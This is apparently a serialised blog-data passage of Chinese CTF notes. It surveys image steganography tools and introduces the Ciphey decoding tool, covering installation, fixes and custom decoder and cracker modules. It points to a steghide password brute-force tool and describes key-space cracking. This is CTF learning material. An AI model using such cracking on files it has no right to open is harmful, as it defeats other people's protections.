src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-12-03-20-image.png\" class=\"\">\n\n<p>青少年CTF训练赛–光头强小分队2</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-00-12-09-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-00-16-21-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-00-16-48-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-00-24-18-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-00-30-42-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-12-16-image.png\" class=\"\">\n\n<p>先做反转再添加1，同样能达到上面程序执行的效果：</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-11-44-image.png\" class=\"\">\n\n<h2 id=\"5-F5-steganography\"><a href=\"#5-F5-steganography\" class=\"headerlink\" title=\"5 F5-steganography\"></a>5 F5-steganography</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-19-26-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-19-48-image.png\" class=\"\">\n\n<h2 id=\"6-Jphswin\"><a href=\"#6-Jphswin\" class=\"headerlink\" title=\"6 Jphswin\"></a>6 Jphswin</h2><p>一款图形化界面的JPHS隐写工具 <a href=\"https://pan.baidu.com/s/1n8rGiHew6U9bxoSAMTT7_w\">下载地址</a>（提取码：n9ao）<br>导入图片，加密就点hide输入密码（也可不用密码）然后save一下就好了，解密就点seek输入密码（也可能没密码）</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-33-35-image.png\" class=\"\">\n\n<h2 id=\"7-Zsteg（lsb隐写）\"><a href=\"#7-Zsteg（lsb隐写）\" class=\"headerlink\" title=\"7 Zsteg（lsb隐写）\"></a>7 Zsteg（lsb隐写）</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-35-01-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-35-47-image.png\" class=\"\">\n\n<h2 id=\"8-BlindWaterMark\"><a href=\"#8-BlindWaterMark\" class=\"headerlink\" title=\"8 BlindWaterMark\"></a>8 BlindWaterMark</h2><p>盲水印脚本-python</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-38-22-image.png\" class=\"\">\n\n<p>更多参考<a href=\"https://cloud.tencent.com/developer/article/2069964\">CTF-图片隐写那些事儿 - 腾讯云开发者社区-腾讯云</a></p>\n<h2 id=\"9-silenteye隐写\"><a href=\"#9-silenteye隐写\" class=\"headerlink\" title=\"9 silenteye隐写\"></a>9 silenteye隐写</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-39-52-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-41-18-image.png\" class=\"\">\n\n<h2 id=\"10-exiftool（查看图片exif信息）\"><a href=\"#10-exiftool（查看图片exif信息）\" class=\"headerlink\" title=\"10 exiftool（查看图片exif信息）\"></a>10 exiftool（查看图片exif信息）</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-42-49-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-43-01-image.png\" class=\"\">\n\n<h2 id=\"11-pngcheck-（检查IDAT块-win）\"><a href=\"#11-pngcheck-（检查IDAT块-win）\" class=\"headerlink\" title=\"11 pngcheck （检查IDAT块_win）\"></a>11 pngcheck （检查IDAT块_win）</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-49-16-image.png\" class=\"\">\n\n<h2 id=\"12-WebP（webp文件操作）\"><a href=\"#12-WebP（webp文件操作）\" class=\"headerlink\" title=\"12 WebP（webp文件操作）\"></a>12 WebP（webp文件操作）</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-52-50-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-53-19-image.png\" class=\"\">\n\n<h2 id=\"13-stegpy（支持多种文件加密）\"><a href=\"#13-stegpy（支持多种文件加密）\" class=\"headerlink\" title=\"13 stegpy（支持多种文件加密）\"></a>13 stegpy（支持多种文件加密）</h2><p>此种加密支持对PNG、BMP、GIF、WebP和WAV格式加密，同时可以选择有无password</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-55-07-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-55-28-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-55-46-image.png\" class=\"\">\n\n<p>用于解青少年CTF训练赛–光头强小分队2</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-56-16-image.png\" class=\"\">\n\n<p>更多音视频隐写请：<a href=\"http://www.ga1axy.top/index.php/archives/6/#12pngbmp\">Misc工具（22.7.6更） - Ga1@xy’s W0r1d</a></p>\n","excerpt":"","more":"<h1 id=\"CTF-图片隐写那些事儿\"><a href=\"#CTF-图片隐写那些事儿\" class=\"headerlink\" title=\"CTF-图片隐写那些事儿\"></a>CTF-图片隐写那些事儿</h1><h2 id=\"1-steghide\"><a href=\"#1-steghide\" class=\"headerlink\" title=\"1 steghide\"></a>1 steghide</h2><p>分为windows和linux两个版本，（jpg隐藏信息）</p>\n<p>Steghide是一种隐写程序，能够隐藏各种图像和音频文件中的数据。颜色方面的样本频率不会更改，主要是对jpg文件。</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-11-43-28-image.png\" class=\"\">\n\n<p>steghide-0.5.1-win32.zip   已下载软件及其版本</p>\n<p>以下是kali下使用方法：</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-11-46-30-image.png\" class=\"\">\n\n<p>steghide爆破密码：</p>\n<blockquote>\n<p>有些题目用steghide加密文件但是不给密码，此时就需要爆破，steghide本身并不支持爆破，需要一些其他的方法：<a href=\"https://github.com/Va5c0/Steghide-Brute-Force-Tool\">GitHub - Va5c0&#x2F;Steghide-Brute-Force-Tool</a></p>\n</blockquote>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-11-47-55-image.png\" class=\"\">\n\n<h2 id=\"2-stegdetect\"><a href=\"#2-stegdetect\" class=\"headerlink\" title=\"2 stegdetect\"></a>2 stegdetect</h2><p>Stegdetect主要用于分析JPEG文件，可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息（PS：我没用过）<br>Stegdetect通过统计测试来分析图像文件中是否包含隐藏内容；运行静态测试以判断隐藏的内容是否存在；尝试识别隐藏内容是通过哪个隐写工具嵌入的。</p>\n<p>kali安装命令</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-12-08-09-image.png\" class=\"\">\n\n<p>使用方法：</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-12-35-46-image.png\" class=\"\"><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-12-38-47-image.png\" class=\"\">\n\n<h2 id=\"3-outguess\"><a href=\"#3-outguess\" class=\"headerlink\" title=\"3 outguess\"></a>3 outguess</h2><p>OutGuess是一种通用的隐写工具，允许插入隐藏信息到数据源的冗余位中。</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-11-50-13-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-11-50-30-image.png\" class=\"\">\n\n<p>没有密码的则kali下使用</p>\n<p>outguess -r avatar.jpg -t 1.txt</p>\n<h2 id=\"4-Stegsolve\"><a href=\"#4-Stegsolve\" class=\"headerlink\" title=\"4 Stegsolve\"></a>4 Stegsolve</h2><p>一款ctf中常用的图形化工具，需要安装java环境，破解LSB算法、隐藏二维码等</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-12-02-32-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-27-12-03-20-image.png\" class=\"\">\n\n<p>青少年CTF训练赛–光头强小分队2</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-00-12-09-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-00-16-21-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-00-16-48-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-00-24-18-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-00-30-42-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-12-16-image.png\" class=\"\">\n\n<p>先做反转再添加1，同样能达到上面程序执行的效果：</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-11-44-image.png\" class=\"\">\n\n<h2 id=\"5-F5-steganography\"><a href=\"#5-F5-steganography\" class=\"headerlink\" title=\"5 F5-steganography\"></a>5 F5-steganography</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-19-26-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-19-48-image.png\" class=\"\">\n\n<h2 id=\"6-Jphswin\"><a href=\"#6-Jphswin\" class=\"headerlink\" title=\"6 Jphswin\"></a>6 Jphswin</h2><p>一款图形化界面的JPHS隐写工具 <a href=\"https://pan.baidu.com/s/1n8rGiHew6U9bxoSAMTT7_w\">下载地址</a>（提取码：n9ao）<br>导入图片，加密就点hide输入密码（也可不用密码）然后save一下就好了，解密就点seek输入密码（也可能没密码）</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-33-35-image.png\" class=\"\">\n\n<h2 id=\"7-Zsteg（lsb隐写）\"><a href=\"#7-Zsteg（lsb隐写）\" class=\"headerlink\" title=\"7 Zsteg（lsb隐写）\"></a>7 Zsteg（lsb隐写）</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-35-01-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-35-47-image.png\" class=\"\">\n\n<h2 id=\"8-BlindWaterMark\"><a href=\"#8-BlindWaterMark\" class=\"headerlink\" title=\"8 BlindWaterMark\"></a>8 BlindWaterMark</h2><p>盲水印脚本-python</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-38-22-image.png\" class=\"\">\n\n<p>更多参考<a href=\"https://cloud.tencent.com/developer/article/2069964\">CTF-图片隐写那些事儿 - 腾讯云开发者社区-腾讯云</a></p>\n<h2 id=\"9-silenteye隐写\"><a href=\"#9-silenteye隐写\" class=\"headerlink\" title=\"9 silenteye隐写\"></a>9 silenteye隐写</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-39-52-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-41-18-image.png\" class=\"\">\n\n<h2 id=\"10-exiftool（查看图片exif信息）\"><a href=\"#10-exiftool（查看图片exif信息）\" class=\"headerlink\" title=\"10 exiftool（查看图片exif信息）\"></a>10 exiftool（查看图片exif信息）</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-42-49-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-43-01-image.png\" class=\"\">\n\n<h2 id=\"11-pngcheck-（检查IDAT块-win）\"><a href=\"#11-pngcheck-（检查IDAT块-win）\" class=\"headerlink\" title=\"11 pngcheck （检查IDAT块_win）\"></a>11 pngcheck （检查IDAT块_win）</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-49-16-image.png\" class=\"\">\n\n<h2 id=\"12-WebP（webp文件操作）\"><a href=\"#12-WebP（webp文件操作）\" class=\"headerlink\" title=\"12 WebP（webp文件操作）\"></a>12 WebP（webp文件操作）</h2><img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-52-50-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-53-19-image.png\" class=\"\">\n\n<h2 id=\"13-stegpy（支持多种文件加密）\"><a href=\"#13-stegpy（支持多种文件加密）\" class=\"headerlink\" title=\"13 stegpy（支持多种文件加密）\"></a>13 stegpy（支持多种文件加密）</h2><p>此种加密支持对PNG、BMP、GIF、WebP和WAV格式加密，同时可以选择有无password</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-55-07-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-55-28-image.png\" class=\"\">\n\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-55-46-image.png\" class=\"\">\n\n<p>用于解青少年CTF训练赛–光头强小分队2</p>\n<img src=\"/2024/11/15/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/2022-11-28-01-56-16-image.png\" class=\"\">\n\n<p>更多音视频隐写请：<a href=\"http://www.ga1axy.top/index.php/archives/6/#12pngbmp\">Misc工具（22.7.6更） - Ga1@xy’s W0r1d</a></p>\n"},{"title":"Ciphey的概述","date":"2024-11-15T13:14:24.000Z","_content":"\nCiphey的概述\n\n无论是在日常的渗透测试、代码审计等工作，亦或是在CTF竞赛中，总是能碰到一些不能一眼看出编码规则的字符串，这些字符串的编码规则或许并不复杂，但由于有限的知识面和脑洞并不能马上解码，严重影响效率。市面上也有不少的自动识别编码并解码的工具，但是这些工具绝大多数都是基于匹配规则来实现的，也就是说都是基于已经存在的编码规则，才能够解码。本文需要讲解的Ciphey 解码工具，和以往的解码工具大不相同，是基于自然语言处理和人工智能实现的解码，无论是在准确率还是速度上，都有质的飞跃。\n\nCiphey是在 Github 开源的一款使用python开发，基于自然语言处理和人工智能的密码学解码工具。截止到2022年7月，该项目已经获得了10.3k 个星标，多次登上 Github 项目精选。此处通过一个小小的例子来展示Ciphey的功能。\n\nCiphey的安装非常简单，可以直接通过 Python 的包管理工具 pip 安装。直接在终端输入以下命令即可安装：\n\n`pip install ciphey`\n\n![](Ciphey的概述/2022-12-21-22-12-14-2022-09-11-10-26-47-image.png)\n\nwindows下安装首先得有python环境，建议python版本3.7以上，推荐3.8\n\n`pip install ciphey  -i http://mirrors.aliyun.com/pypi/simple/`\n\n`ciphey -t \"I44EOOLCIFUDQ5KLME======\"`\n\n测试会出来这样的错误提示 ，UnicodeDecodeError: 'gbk' codec can't decode byte 0xbf in position 695: illegal multibyte sequence，\n\n根据错误修改代码，主要是在读取文件的时候发生错误，将\"r\" 改为\"rb\"，如下图，问题出在regex_identifier.py,把\"r\" 改为\"rb\"。如下图\n![](Ciphey的概述/2022-12-21-22-12-39-2022-09-11-10-24-43-image.png)\n\nCiphey还封装了 docker 镜像，也可以直接运行docker容器，命令如下：\n\n`docker run -it --rm remnux/ciphfey`\n\n**¤ 文件输入模式：** 直接将待解码内容以文本的形式传入 Ciphey，输入命令“ciphey -f encrypted.txt“ 即可，其中encrypted.txt中的内容就是输入文本。\n\n**¤ 宽松模式：** 宽松模式指的是格式简单，直接将待解码文本使用双引号约束，并作为参数输入，如：ciphey –— “Encrypted input”。\n\n**¤ 严格模式：** 通过参数 “-t“ 后接待解码内容。如：ciphey –t “Encrypted input”。\n\n> There are 3 ways to run Ciphey.\n> \n> 1. File Input `ciphey -f encrypted.txt`\n> 2. Unqualified input `ciphey -- \"Encrypted input\"`\n> 3. Normal way `ciphey -t \"Encrypted input\"`\n\n# **加入自定义算法到** Ciphey\n\n> 试想一下，如果有一天新的编码算法被提出，或者说在CTF竞赛时，参赛者已知某个字符串的编码规则里面存在某一个算法，而该算法并不在Ciphey当中，这将使得Ciphey的实用性大打折扣，所以Ciphey在设计时也意识到了这一点，于是事先就定义好了自定义算法的增加接口，允许使用者增加自定义的解码算法和破译算法。\n\n##### 在Ciphey中加入自定义解码算法\n\n首先创建一个 py 文件，名称可以自定义，但最好是与编码算法名称一致，比如这里取名testLetter.py ，内容大致如下：\n\n![](Ciphey的概述/2022-12-21-22-12-59-2022-09-11-10-38-39-image.png)\n\n这里需要注意的首先是类名，这类名实际上就表示了编码算法，本例中使用了TestLetter作为演示，函数逻辑则在decode里面实现。为了能让读者更加清晰的看到效果，本解码算法直接返回字符串“flag{this_is_a_test}”。另外需要注意的则是priority函数，priority 表示的是该编码算法的优先权，值越高，表示该算法出现的频率越高，反之则表示算法频率越低。所以在Ciphey中，Unicode 这类常见编码的priority值就相对比较高,达到了0.9，而不常见的一般使用0.05，同样的，为了演示效果，将本编码的priority设置成了0.99。\n\n为了能够在Ciphey中使用新增的解码算法，一般建议将该py文件放置到Ciphey项目中的ciphey/basemods/Decoders目录下，然后重新编译生成模块。但是考虑到很多的使用者仅仅是临时的加入某一个算法，并不需要持久的使用，所以还有另外一种方式增加，直接在使用二进制程序ciphey 时增加参数 -m testLetter.py 即可。具体演示如下图所示，从图中可以看出，解码算法testletter 已经在Ciphey中起到了作用，并且直接输出了testletter 的解码值。\n\n![](Ciphey的概述/2022-12-21-22-10-16-2022-09-11-10-41-58-image.png)\n\n##### 在Ciphey中加入自定义破译算法\n\n和增加自定义解码算法类似的，增加自定义破译算法也是通过编写一个py文件来实现算法。除hash函数以外，其它的绝大多数密码算法都是存在密钥，所以破译算法实际上就是对弱口令的或者密钥空间的穷举。下面通过一个简单的示例来介绍如何添加。\n\n首先新建一个py文件，命名自定义，最好与密码算法相关，本示例使用 testcrack.py，内容如下：\n\n![](Ciphey的概述/2022-12-21-22-13-33-2022-09-11-10-46-23-image.png)\n\n整体的框架和自定义解码函数是一致的，需要特别指出的是 attemptCrack 函数，破译的逻辑就是在这个函数实现。为了方便演示，本示例直接返回了一个字符串“flag{this_is_diy_crackers}” 作为结果，这里需要注意的是，返回的是一个包含CrackResult对象的候选数组。直接使用命令 ciphey -m testcrack.py -t “abs3R4FASF4W34”，即可得到下图所示结果。\n\n![](Ciphey的概述/2022-12-21-22-10-53-2022-09-11-10-48-29-image.png)\n\n![](Ciphey的概述/2022-12-21-22-11-28-2022-09-11-19-00-55-image.png)\n\n## 在Windows下解决问题\n\n使用anaconda 的虚拟环境，使用python 3.8 及64 位建立tools ：\n\n![](Ciphey的概述/2022-12-25-20-06-01-2022-12-25-18-13-51-image.png)\n\n`pip install ciphey -i https://pypi.mirrors.ustc.edu.cn/simple`\n\n![](Ciphey的概述/2022-12-25-20-07-09-2022-12-25-19-35-44-image.png)\n\n使用中出现如下错误：\n\n![](Ciphey的概述/2022-12-25-20-08-46-2022-12-25-19-47-51-image.png)在对应的文件位置修改，加上 b ：\n\n![](Ciphey的概述/2022-12-25-20-08-22-2022-12-25-19-47-14-image.png)\n\n正常使用：\n\n![](Ciphey的概述/2022-12-25-20-09-20-2022-12-25-19-58-59-image.png)\n\n如果不是想要的结果可以输入 n，不是N，继续运算，直至正确结果，如上图。\n\n2022年羊城杯签到题可以直接解答：Misc 签个到 凯撒/ROT13,后base32\n\n![](Ciphey的概述/2023-08-31-20-48-51-image.png)\n","source":"_posts/Ciphey的概述.md","raw":"---\ntitle: Ciphey的概述\ndate: 2024-11-15 21:14:24\ntags:\n\n---\n\nCiphey的概述\n\n无论是在日常的渗透测试、代码审计等工作，亦或是在CTF竞赛中，总是能碰到一些不能一眼看出编码规则的字符串，这些字符串的编码规则或许并不复杂，但由于有限的知识面和脑洞并不能马上解码，严重影响效率。市面上也有不少的自动识别编码并解码的工具，但是这些工具绝大多数都是基于匹配规则来实现的，也就是说都是基于已经存在的编码规则，才能够解码。本文需要讲解的Ciphey 解码工具，和以往的解码工具大不相同，是基于自然语言处理和人工智能实现的解码，无论是在准确率还是速度上，都有质的飞跃。\n\nCiphey是在 Github 开源的一款使用python开发，基于自然语言处理和人工智能的密码学解码工具。截止到2022年7月，该项目已经获得了10.3k 个星标，多次登上 Github 项目精选。此处通过一个小小的例子来展示Ciphey的功能。\n\nCiphey的安装非常简单，可以直接通过 Python 的包管理工具 pip 安装。直接在终端输入以下命令即可安装：\n\n`pip install ciphey`\n\n![](Ciphey的概述/2022-12-21-22-12-14-2022-09-11-10-26-47-image.png)\n\nwindows下安装首先得有python环境，建议python版本3.7以上，推荐3.8\n\n`pip install ciphey  -i http://mirrors.aliyun.com/pypi/simple/`\n\n`ciphey -t \"I44EOOLCIFUDQ5KLME======\"`\n\n测试会出来这样的错误提示 ，UnicodeDecodeError: 'gbk' codec can't decode byte 0xbf in position 695: illegal multibyte sequence，\n\n根据错误修改代码，主要是在读取文件的时候发生错误，将\"r\" 改为\"rb\"，如下图，问题出在regex_identifier.py,把\"r\" 改为\"rb\"。如下图\n![](Ciphey的概述/2022-12-21-22-12-39-2022-09-11-10-24-43-image.png)\n\nCiphey还封装了 docker 镜像，也可以直接运行docker容器，命令如下：\n\n`docker run -it --rm remnux/ciphfey`\n\n**¤ 文件输入模式：** 直接将待解码内容以文本的形式传入 Ciphey，输入命令“ciphey -f encrypted.txt“ 即可，其中encrypted.txt中的内容就是输入文本。\n\n**¤ 宽松模式：** 宽松模式指的是格式简单，直接将待解码文本使用双引号约束，并作为参数输入，如：ciphey –— “Encrypted input”。\n\n**¤ 严格模式：** 通过参数 “-t“ 后接待解码内容。如：ciphey –t “Encrypted input”。\n\n> There are 3 ways to run Ciphey.\n> \n> 1. File Input `ciphey -f encrypted.txt`\n> 2. Unqualified input `ciphey -- \"Encrypted input\"`\n> 3. Normal way `ciphey -t \"Encrypted input\"`\n\n# **加入自定义算法到** Ciphey\n\n> 试想一下，如果有一天新的编码算法被提出，或者说在CTF竞赛时，参赛者已知某个字符串的编码规则里面存在某一个算法，而该算法并不在Ciphey当中，这将使得Ciphey的实用性大打折扣，所以Ciphey在设计时也意识到了这一点，于是事先就定义好了自定义算法的增加接口，允许使用者增加自定义的解码算法和破译算法。\n\n##### 在Ciphey中加入自定义解码算法\n\n首先创建一个 py 文件，名称可以自定义，但最好是与编码算法名称一致，比如这里取名testLetter.py ，内容大致如下：\n\n![](Ciphey的概述/2022-12-21-22-12-59-2022-09-11-10-38-39-image.png)\n\n这里需要注意的首先是类名，这类名实际上就表示了编码算法，本例中使用了TestLetter作为演示，函数逻辑则在decode里面实现。为了能让读者更加清晰的看到效果，本解码算法直接返回字符串“flag{this_is_a_test}”。另外需要注意的则是priority函数，priority 表示的是该编码算法的优先权，值越高，表示该算法出现的频率越高，反之则表示算法频率越低。所以在Ciphey中，Unicode 